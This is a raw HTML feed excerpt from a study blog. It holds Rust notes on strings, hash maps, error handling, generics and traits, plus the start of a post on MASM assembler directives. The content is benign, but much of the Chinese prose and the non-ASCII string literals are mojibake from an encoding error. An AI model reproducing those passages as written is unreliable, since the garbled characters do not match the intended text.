class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">SpreadsheetCell</span></span> &#123;<br>    Int(<span class="hljs-built_in">i32</span>),<br>    Float(<span class="hljs-built_in">f64</span>),<br>    Text(<span class="hljs-built_in">String</span>),<br>&#125;<br><span class="hljs-keyword">let</span> row = <span class="hljs-built_in">vec!</span>[<br>    SpreadsheetCell::Int(<span class="hljs-number">3</span>),<br>    SpreadsheetCell::Text(<span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;blue&quot;</span>)),<br>    SpreadsheetCell::Float(<span class="hljs-number">10.12</span>),<br>];<br></code></pre></div></td></tr></table></figure><h2 id="string-DOC"><a href="#string-DOC" class="headerlink" title="string(DOC)"></a>string(<a href="https://doc.rust-lang.org/stable/std/string/struct.String.html">DOC</a>)</h2><ul><li>For that, we use the <code>to_string</code> method, which is available on <strong>any type</strong> that implements the <code>Display</code> trait, as string literals do. </li><li>we can find out that the implementation of string is Vec.</li></ul><h3 id="CREATE-A-NEW-STRING"><a href="#CREATE-A-NEW-STRING" class="headerlink" title="CREATE A NEW STRING"></a>CREATE A NEW STRING</h3><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><br><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> s = <span class="hljs-built_in">String</span>::new();<br><span class="hljs-keyword">let</span> data = <span class="hljs-string">&quot;initial contents&quot;</span>;<br><span class="hljs-keyword">let</span> s = data.to_string();<br><span class="hljs-comment">// the method also works on a literal directly:</span><br><span class="hljs-keyword">let</span> s = <span class="hljs-string">&quot;initial contents&quot;</span>.to_string();<br><span class="hljs-comment">// or you can:</span><br><span class="hljs-keyword">let</span> s = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;initial contents&quot;</span>);<br><span class="hljs-comment">//strings are UTF-8 encoded, so we can include any properly encoded data, like:</span><br><span class="hljs-keyword">let</span> hello = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;Ø§Ù„Ø³Ù„Ø§Ù… Ø¹Ù„ÙŠÙƒÙ…&quot;</span>);<br><br><br></code></pre></div></td></tr></table></figure><h3 id="UPDATING-THE-STRING"><a href="#UPDATING-THE-STRING" class="headerlink" title="UPDATING THE STRING"></a>UPDATING THE STRING</h3><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust">s.push_str(<span class="hljs-string">&quot;initial&quot;</span>);<span class="hljs-comment">//it&#x27;s a method--</span><br>s.push(<span class="hljs-string">&#x27;l&#x27;</span>);<span class="hljs-comment">//push single character and single quote</span><br>s = s1 + s2;<span class="hljs-comment">//the &#x27;+&#x27; operation use the add() method</span><br></code></pre></div></td></tr></table></figure><ul><li>pay attention to the ownership taking</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> s1 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;foo&quot;</span>);<br><span class="hljs-keyword">let</span> s2 = <span class="hljs-string">&quot;bar&quot;</span>;<br>s1.push_str(s2);<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;s2 is &#123;&#125;&quot;</span>, s2);<br></code></pre></div></td></tr></table></figure><ul><li><em><strong>deref coercion</strong></em>: why does the first line compile ? Because Rust compiler can coerce <code>&amp;String</code> into a <code>&amp;str</code> </li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> s3 = s1 + &amp;s2;<span class="hljs-comment">//they are all strings, compiler turns &amp;s2 into &amp;s2[..], and s1 has been moved </span><br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">add</span></span>(<span class="hljs-keyword">self</span>, s: &amp;<span class="hljs-built_in">str</span>) -&gt; <span class="hljs-built_in">String</span> &#123;<span class="hljs-comment">//add&#x27;s signature, s1 don&#x27;t have &#x27;&amp;&#x27; which will take the ownership</span><br></code></pre></div></td></tr></table></figure><ul><li>For more complicated string <strong>combining</strong>, we can use the <code>format!</code> macro</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> s1 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;tic&quot;</span>);<br>    <span class="hljs-keyword">let</span> s2 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;tac&quot;</span>);<br>    <span class="hljs-keyword">let</span> s3 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;toe&quot;</span>);<br><span class="hljs-comment">//format! macro uses references so that this call doesnâ€™t take ownership of any of its parameters.</span><br>    <span class="hljs-keyword">let</span> s = <span class="hljs-built_in">format!</span>(<span class="hljs-string">&quot;&#123;&#125;-&#123;&#125;-&#123;&#125;&quot;</span>, s1, s2, s3);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="INDEXING"><a href="#INDEXING" class="headerlink" title="INDEXING"></a>INDEXING</h3><ul><li>try to index will lead to an error, because String is a wrapper of Vec&lt;u8&gt; </li><li>You must use range syntax like :</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> hello = <span class="hljs-string">&quot;Ğ—Ğ´Ñ€Ğ°Ğ²ÑÑ‚Ğ²ÑƒĞ¹Ñ‚Ğµ&quot;</span>;<br><span class="hljs-keyword">let</span> s = &amp;hello[<span class="hljs-number">0</span>..<span class="hljs-number">4</span>];<br></code></pre></div></td></tr></table></figure><p>â€‹        But you canâ€™t simply use the &amp;hello[0..1]  because index 1 is not a char boundary.</p><ul><li>Use for_in_ to iterating over strings.</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;à¤¨à¤®à¤¸à¥à¤¤à¥‡&quot;</span>.chars() &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, c);<br>&#125;<br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;à¤¨à¤®à¤¸à¥à¤¤à¥‡&quot;</span>.bytes() &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, b);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>This trade-off exposes more of the complexity of strings than is apparent in other programming languages, but it prevents you from having to handle errors involving non-ASCII characters later in your development life cycle.</li></ul><h2 id="hash-map"><a href="#hash-map" class="headerlink" title="hash map"></a>hash map</h2><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> std::collections::HashMap;<br><br><span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªHashMapï¼Œç”¨äºå­˜å‚¨å®çŸ³ç§ç±»å’Œå¯¹åº”çš„æ•°é‡</span><br><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> my_gems = HashMap::new();<br><span class="hljs-comment">//æˆ–è€…åˆ›å»ºæŒ‡å®šå¤§å°çš„map, æé«˜ä½¿ç”¨æ€§èƒ½</span><br><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> blank = HashMap::with_capacity(capacity)<br><br><span class="hljs-comment">// å°†å®çŸ³ç±»å‹å’Œå¯¹åº”çš„æ•°é‡å†™å…¥è¡¨ä¸­</span><br>my_gems.insert(<span class="hljs-string">&quot;çº¢å®çŸ³&quot;</span>, <span class="hljs-number">1</span>);<br>my_gems.insert(<span class="hljs-string">&quot;è“å®çŸ³&quot;</span>, <span class="hljs-number">2</span>);<br>my_gems.insert(<span class="hljs-string">&quot;æ²³è¾¹æ¡çš„è¯¯ä»¥ä¸ºæ˜¯å®çŸ³çš„ç ´çŸ³å¤´&quot;</span>, <span class="hljs-number">18</span>);<br><br><span class="hljs-comment">//ä»vec teams_liståˆ°hashmap teams_map. ä¸‹åˆ’çº¿è¡¨ç¤ºç¼–è¯‘å™¨è‡ªåŠ¨æ¨å¯¼. </span><br><span class="hljs-keyword">let</span> teams_map: HashMap&lt;_,_&gt; = teams_list.into_iter().collect();<br><br></code></pre></div></td></tr></table></figure><p>HashMap çš„æ‰€æœ‰æƒè§„åˆ™ä¸å…¶å®ƒ Rust ç±»å‹æ²¡æœ‰åŒºåˆ«ï¼š</p><ul><li>è‹¥ç±»å‹å®ç° <code>Copy</code> ç‰¹å¾ï¼Œè¯¥ç±»å‹ä¼šè¢«å¤åˆ¶è¿› <code>HashMap</code>ï¼Œå› æ­¤æ— æ‰€è°“æ‰€æœ‰æƒ</li><li>è‹¥æ²¡å®ç° <code>Copy</code> ç‰¹å¾ï¼Œæ‰€æœ‰æƒå°†è¢«è½¬ç§»ç»™ <code>HashMap</code> ä¸­</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust">std::mem::<span class="hljs-built_in">drop</span>(name);<br></code></pre></div></td></tr></table></figure><h1 id="Error-Handling"><a href="#Error-Handling" class="headerlink" title="Error Handling"></a><a href="https://doc.rust-lang.org/book/ch09-00-error-handling.html#error-handling">Error Handling</a></h1><ul><li>Rust group errors into two categories: <em>recoverable and unrecoverable errors</em>. Most languages donâ€™t distinguish these two kinds of errors, using mechanism such as exceptions. <strong>Rust donâ€™t have exceptions</strong>. Instead, it has the type <code>Result&lt;T,Â E&gt;</code> for recoverable errors and the <code>panic!</code> macro that stops execution when the program encounters an unrecoverable error.</li></ul><h1 id="Generic-Types-Traits-and-Lifetimes"><a href="#Generic-Types-Traits-and-Lifetimes" class="headerlink" title="Generic Types, Traits, and Lifetimes"></a>Generic Types, Traits, and Lifetimes</h1><ul><li>we can restrict the types valid for <code>T</code> to only those that implement <code>PartialOrd</code>(or std::fmt::Debug below)<br>so that can implement generic comparation.</li></ul><p>const æ³›å‹: å¯¹å€¼çš„æ³›å‹.</p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">display_array</span></span>&lt;T: std::fmt::<span class="hljs-built_in">Debug</span>, <span class="hljs-keyword">const</span> N: <span class="hljs-built_in">usize</span>&gt;(arr: [T; N]) &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>, arr);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> arr: [<span class="hljs-built_in">i32</span>; <span class="hljs-number">3</span>] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];<br>    display_array(arr);<br><br>    <span class="hljs-keyword">let</span> arr: [<span class="hljs-built_in">i32</span>; <span class="hljs-number">2</span>] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>];<br>    display_array(arr);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><p>A <em><strong>trait</strong></em> defines functionality a particular type has and can share with other types.</p><ul><li><strong>å­¤å„¿è§„åˆ™</strong>: å¦‚æœä½ æƒ³è¦ä¸ºç±»å‹ <code>A</code> å®ç°ç‰¹å¾ <code>T</code>ï¼Œé‚£ä¹ˆ <code>A</code> æˆ–è€… <code>T</code> è‡³å°‘æœ‰ä¸€ä¸ªæ˜¯åœ¨å½“å‰ä½œç”¨åŸŸä¸­å®šä¹‰çš„, è¿™æ ·åˆ«äººçš„ä»£ç ä¸ä¼šå½±å“ä½ çš„ä»£ç .</li><li>ç‰¹å¾å¯ä»¥æœ‰é»˜è®¤å®ç°. </li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">pub</span> <span class="hljs-class"><span class="hljs-keyword">trait</span> <span class="hljs-title">Summary</span></span> &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">summarize</span></span>(&amp;<span class="hljs-keyword">self</span>) -&gt; <span class="hljs-built_in">String</span> &#123;<br>        <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;(Read more...)&quot;</span>)<br>    &#125;<br>&#125;<br><span class="hljs-keyword">impl</span> Summary <span class="hljs-keyword">for</span> Weibo &#123; ...... &#125; <span class="hljs-comment">//ä¸ºWeiboå®ç°Summaryç‰¹å¾</span><br></code></pre></div></td></tr></table></figure><ul><li>ç‰¹å¾å‚æ•°. å½¢å¦‚ <code>T: Summary</code> è¢«ç§°ä¸º<strong>ç‰¹å¾çº¦æŸ</strong>. </li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">pub</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">notify</span></span>(item: &amp;<span class="hljs-keyword">impl</span> Summary) &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Breaking news! &#123;&#125;&quot;</span>, item.summarize());<br>&#125;<br><span class="hljs-comment">//ä¸Šé¢çš„è¯­æ³•ç³–ç­‰åŒäº</span><br><span class="hljs-keyword">pub</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">notify</span></span>&lt;T: Summary&gt;(item: &amp;T) &#123; ...... &#125;<br><span class="hljs-comment">//ä¼˜åŠ¿åœ¨å¯ä»¥ä½¿ä¸¤ä¸ªå‚æ•°éƒ½ä¸ºåŒä¸€ç±»å‹.</span><br><span class="hljs-keyword">pub</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">notify</span></span>&lt;T: Summary&gt;(item1: &amp;T, item2: &amp;T) &#123;&#125;<br><span class="hljs-comment">//å¤šé‡çº¦æŸ</span><br><span class="hljs-keyword">pub</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">notify</span></span>(item: &amp;(<span class="hljs-keyword">impl</span> Summary + Display)) &#123;&#125;<br><span class="hljs-keyword">pub</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">notify</span></span>&lt;T: Summary + Display&gt;(item: &amp;T) &#123;&#125;<br><span class="hljs-comment">//whereçº¦æŸç®€åŒ–å¤æ‚çº¦æŸ.</span><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">some_function</span></span>&lt;T, U&gt;(t: &amp;T, u: &amp;U) -&gt; <span class="hljs-built_in">i32</span><br>    <span class="hljs-keyword">where</span> T: Display + <span class="hljs-built_in">Clone</span>,<br>          U: <span class="hljs-built_in">Clone</span> + <span class="hljs-built_in">Debug</span><br>&#123;&#125;<br></code></pre></div></td></tr></table></figure><ul><li>å¾…çœ‹. </li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>programming_language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>programming_language</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Assembly Language</title>
    <link href="/2021-08/pwn-start-Assembly/"/>
    <url>/2021-08/pwn-start-Assembly/</url>
    
    <content type="html"><![CDATA[<h1 id="æ•´è¿™äº›æœ‰çš„æ²¡çš„ä¸å¦‚çœ‹gasçš„å®˜æ–¹æ–‡æ¡£"><a href="#æ•´è¿™äº›æœ‰çš„æ²¡çš„ä¸å¦‚çœ‹gasçš„å®˜æ–¹æ–‡æ¡£" class="headerlink" title="æ•´è¿™äº›æœ‰çš„æ²¡çš„ä¸å¦‚çœ‹gasçš„å®˜æ–¹æ–‡æ¡£"></a>æ•´è¿™äº›æœ‰çš„æ²¡çš„ä¸å¦‚çœ‹gasçš„<a href="https://sourceware.org/binutils/docs-2.38/as/index.html">å®˜æ–¹æ–‡æ¡£</a></h1><p>ç°åœ¨ä¸»è¦ç”¨åˆ°çš„å°±æ˜¯gas, æ‰€ä»¥æ•´ç‚¹gasåŸºç¡€çš„ä¸œè¥¿.</p><ul><li><strong>If the symbol begins with a letter the statement is an assembly language <em>instruction</em></strong>  </li><li></li></ul><hr><h1 id="æ±‡ç¼–è¯­è¨€ä¼ªæŒ‡ä»¤-æœ€è¦å‘½çš„"><a href="#æ±‡ç¼–è¯­è¨€ä¼ªæŒ‡ä»¤-æœ€è¦å‘½çš„" class="headerlink" title="æ±‡ç¼–è¯­è¨€ä¼ªæŒ‡ä»¤(æœ€è¦å‘½çš„"></a>æ±‡ç¼–è¯­è¨€ä¼ªæŒ‡ä»¤(æœ€è¦å‘½çš„</h1><blockquote><ul><li>ä¼ªæŒ‡ä»¤ (directive) æ˜¯åµŒå…¥æºä»£ç ä¸­çš„å‘½ä»¤ï¼Œç”±æ±‡ç¼–å™¨è¯†åˆ«å’Œæ‰§è¡Œã€‚ä¼ªæŒ‡ä»¤ä¸åœ¨è¿è¡Œæ—¶æ‰§è¡Œï¼Œä½†æ˜¯å®ƒä»¬å¯ä»¥å®šä¹‰å˜é‡ã€å®å’Œå­ç¨‹åºï¼›ä¸ºå†…å­˜æ®µåˆ†é…åç§°ï¼Œæ‰§è¡Œè®¸å¤šå…¶ä»–ä¸æ±‡ç¼–å™¨ç›¸å…³çš„æ—¥å¸¸ä»»åŠ¡ã€‚</li><li>ç®€å•æ¥è¯´å°±æ˜¯æ–¹ä¾¿ç¼–ç¨‹çš„æŒ‡ä»¤ </li></ul></blockquote><h2 id="åŸºæœ¬"><a href="#åŸºæœ¬" class="headerlink" title="åŸºæœ¬:"></a>åŸºæœ¬:</h2><ul><li><code>.data     .code     .stack</code> å®šä¹‰æ®µ(segment)</li><li><code>.model flat,stdcall</code>å®ƒå‘Šè¯‰æ±‡ç¼–ç¨‹åºç”¨çš„æ˜¯å“ªä¸€ç§å­˜å‚¨æ¨¡å¼</li><li><code>.END</code>æ ‡è®°ä¸€ä¸ªç¨‹åºçš„ç»“æŸ</li></ul><h2 id="æ•°æ®ç±»å‹åŠä¼ªæŒ‡ä»¤"><a href="#æ•°æ®ç±»å‹åŠä¼ªæŒ‡ä»¤" class="headerlink" title="æ•°æ®ç±»å‹åŠä¼ªæŒ‡ä»¤"></a>æ•°æ®ç±»å‹åŠä¼ªæŒ‡ä»¤</h2><h3 id="æ•°æ®å®šä¹‰"><a href="#æ•°æ®å®šä¹‰" class="headerlink" title="æ•°æ®å®šä¹‰"></a>æ•°æ®å®šä¹‰</h3><table><thead><tr><th>ç±»å‹</th><th>ç”¨æ³•</th></tr></thead><tbody><tr><td>BYTE</td><td>8 ä½æ— ç¬¦å·æ•´æ•°ï¼ŒB ä»£è¡¨å­—èŠ‚</td></tr><tr><td>SBYTE</td><td>8 ä½æœ‰ç¬¦å·æ•´æ•°ï¼ŒS ä»£è¡¨æœ‰ç¬¦å·</td></tr><tr><td>WORD</td><td>16 ä½æ— ç¬¦å·æ•´æ•°</td></tr><tr><td>SWORD</td><td>16 ä½æœ‰ç¬¦å·æ•´æ•°</td></tr><tr><td>DWORD</td><td>32 ä½æ— ç¬¦å·æ•´æ•°ï¼ŒD ä»£è¡¨åŒï¼ˆå­—ï¼‰</td></tr><tr><td>SDWORD</td><td>32 ä½æœ‰ç¬¦å·æ•´æ•°ï¼ŒSD ä»£è¡¨æœ‰ç¬¦å·åŒï¼ˆå­—ï¼‰</td></tr><tr><td>FWORD</td><td>48 ä½æ•´æ•°ï¼ˆä¿æŠ¤æ¨¡å¼ä¸­çš„è¿œæŒ‡é’ˆï¼‰</td></tr><tr><td>QWORD</td><td>64 ä½æ•´æ•°ï¼ŒQ ä»£è¡¨å››ï¼ˆå­—ï¼‰</td></tr><tr><td>TBYTE</td><td>80 ä½ï¼ˆ10 å­—èŠ‚ï¼‰æ•´æ•°ï¼ŒT ä»£è¡¨ 10 å­—èŠ‚</td></tr><tr><td>REAL4</td><td>32 ä½ï¼ˆ4 å­—èŠ‚ï¼‰IEEE çŸ­å®æ•°</td></tr><tr><td>REAL8</td><td>64 ä½ï¼ˆ8 å­—èŠ‚ï¼‰IEEE é•¿å®æ•°</td></tr><tr><td>REAL10</td><td>80 ä½ï¼ˆ10 å­—èŠ‚ï¼‰IEEE æ‰©å±•å®æ•°</td></tr></tbody></table><p>è¿˜å¯ä»¥æ˜¯ä¼ ç»Ÿæ•°æ®å®šä¹‰ä¼ªæŒ‡ä»¤ï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºã€‚</p><table><thead><tr><th>ä¼ªæŒ‡ä»¤</th><th>ç”¨æ³•</th><th>ä¼ªæŒ‡ä»¤</th><th>ç”¨æ³•</th></tr></thead><tbody><tr><td>DB</td><td>8ä½æ•´æ•°</td><td>DQ</td><td>64 ä½æ•´æ•°æˆ–å®æ•°</td></tr><tr><td>DW</td><td>16 ä½æ•´æ•°</td><td>DT</td><td>å®šä¹‰ 80 ä½ï¼ˆ10 å­—èŠ‚ï¼‰æ•´æ•°</td></tr><tr><td>DD</td><td>32 ä½æ•´æ•°æˆ–å®æ•°</td><td></td><td></td></tr></tbody></table><p>åˆå§‹åŒ–è¯­å¥</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">[name] directive initializer [,initializer]...<br></code></pre></div></td></tr></table></figure><p>å¦‚æœå¸Œæœ›ä¸å¯¹å˜é‡è¿›è¡Œåˆå§‹åŒ–ï¼ˆéšæœºåˆ†é…æ•°å€¼ï¼‰ï¼Œå¯ä»¥ç”¨ç¬¦å· ? ä½œä¸ºåˆå§‹å€¼, æ‰€æœ‰æ•°å€¼éƒ½ç”±æ±‡ç¼–å™¨æ¥è½¬æˆäºŒè¿›åˆ¶æ•°æ®</p><ul><li><p>BYTE and SBYTE</p><ul><li>å¤šåˆå§‹å€¼å®šä¹‰æ•°ç»„</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">list BYTE 10,20,30,40<br>#ç”šè‡³å¯ä»¥:<br>list BYTE 10,20,30,40<br>     BYTE 50,60,70,80<br>     BYTE 81,82,83,84<br></code></pre></div></td></tr></table></figure><ul><li>å®šä¹‰å­—ç¬¦ä¸²: ä½¿ç”¨BYTE, </li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">greeting1 BYTE &quot;Good afternoon&quot;,0<br>#ä¹Ÿå¯ä»¥<br>greeting1 BYTE &quot;Welcome to the Encryption Demo program &quot;<br>          BYTE &quot;created by Kip Irvine.&quot;,0dh, 0ah<br>#è¿˜å¯ä»¥ä½¿ç”¨backslashåˆ†è¡Œ<br></code></pre></div></td></tr></table></figure><ul><li>DUP æ“ä½œç¬¦: ä½¿ç”¨ä¸€ä¸ªæ•´æ•°è¡¨è¾¾å¼ä½œä¸ºè®¡æ•°å™¨ï¼Œä¸ºå¤šä¸ªæ•°æ®é¡¹åˆ†é…å­˜å‚¨ç©ºé—´</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm"> BYTE 4 DUP ( &quot;STACK&quot; ) ; 20 ä¸ªå­—èŠ‚ï¼š<br>#ç¬¬ä¸€ä¸ªæ•°å­—æ˜¯BYTEçš„ä¸ªæ•°, ç¬¬äºŒä¸ªæ•°å­—ç”±DUPè®¡ç®—å¾—å‡º, å•ä½æ˜¯å­—èŠ‚    <br>#æä¾›äº†ä¸€ç§æ–¹ä¾¿çš„æ–¹å¼æ¥åˆå§‹åŒ–æ•°ç»„:<br>array BYTE 5 DUP (?) ; 5 ä¸ªæ•°å€¼ï¼Œæœªåˆå§‹åŒ–<br></code></pre></div></td></tr></table></figure></li><li><p>WORD and SWORD, DWORD, SDWORD, QWORD, </p></li><li><p>åŒBYTEå’ŒSBYTE</p></li><li><p>å‰©ä¸‹è¿˜æœ‰æµ®ç‚¹ç±»å‹, BCDæ•°æ®ç­‰ç­‰, ä¸çœ‹äº†</p></li></ul><hr><ul><li><p><code>.DATA ?</code>ä¼ªæŒ‡ä»¤å£°æ˜æœªåˆå§‹åŒ–æ•°æ®ã€‚å½“å®šä¹‰å¤§é‡æœªåˆå§‹åŒ–æ•°æ®æ—¶ï¼Œ.DATA ? ä¼ªæŒ‡ä»¤å‡å°‘äº†ç¼–è¯‘ç¨‹åºçš„å¤§å°ã€‚</p></li><li><p>ç­‰å·=ä¼ªæŒ‡ä»¤, ç›¸å½“äºå®å®šä¹‰ä¸€ä¸ªæ•°æ®, å¯å¤šæ¬¡é‡å¤å®šä¹‰</p></li><li><p>å½“å‰åœ°å€è®¡æ•°å™¨:<strong><code>selfPtr DWORD $</code></strong> </p></li><li><p>è®©æ±‡ç¼–å™¨è®¡ç®—æ•°ç»„é•¿åº¦: </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">list BYTE 10,20,30,40<br>ListSize = ($ - list) # æ³¨æ„æ­¤æ—¶è®¡ç®—å‡ºæ¥çš„æ˜¯åœ°å€çš„å·®å€¼, æ‰€ä»¥å•ä½æ˜¯å­—èŠ‚, å¦‚æœé‡åˆ°WORDè¦æ³¨<br></code></pre></div></td></tr></table></figure></li><li><p>EQUä¼ªæŒ‡ä»¤, æ— æ³•å¤šæ¬¡å®šä¹‰</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">name EQU expression    #å¿…é¡»æ˜¯æ•´æ•°è¡¨è¾¾å¼<br>name EQU symbol        #ä»»æ„ä¸€ä¸ªç”¨EQUæˆ–=å®šä¹‰è¿‡çš„ç¬¦å·<br>name EQU &lt;text&gt;        #ç›´æ¥æ–‡æœ¬æ›¿æ¢, æœ€åƒ#define, ä¹Ÿå¯ç”¨æ¥å®šä¹‰å®æ•°<br></code></pre></div></td></tr></table></figure></li><li><p>TEXTEQU æ–‡æœ¬å®ä¼ªæŒ‡ä»¤, </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs 